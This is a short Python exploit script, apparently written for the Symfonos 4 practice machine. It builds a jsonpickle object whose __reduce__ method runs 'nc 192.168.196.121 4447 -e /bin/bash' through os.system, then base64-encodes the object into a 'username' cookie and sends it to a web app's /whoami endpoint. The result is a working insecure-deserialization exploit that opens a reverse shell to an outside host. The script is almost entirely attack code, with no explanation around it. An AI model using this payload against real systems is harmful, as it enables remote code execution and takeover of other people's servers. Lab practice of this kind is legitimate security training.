#!/usr/bin/env python3
# Exploit to vulnerable app in symfonos 4 - byth22

import jsonpickle
import os
import socket
import base64
#import sys
import requests
#import subprocess

# Default target
target = 'localhost:8888'
command = 'nc 192.168.196.121 4447 -e /bin/bash'

# Class for exploitation
class Shell(object):
    def __reduce__(self):
        #return (subprocess.Popen, (('nc 192.168.196.121 4447 -e /bin/bash'),))
        return (os.system, (command,))

# Generate pickle
shell = jsonpickle.encode(Shell())

# Generate base64 for pickle
shell1 = (base64.b64encode(shell.encode()).decode('utf-8'))

# Set encoded pickle in the cookie
cookies = {
    'username': shell1,
}


# Set target on header
headers = {
    'Host': target,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}

# Send request and store response variable
response = requests.get('http://localhost:8888/whoami', headers=headers, cookies=cookies, verify=False)
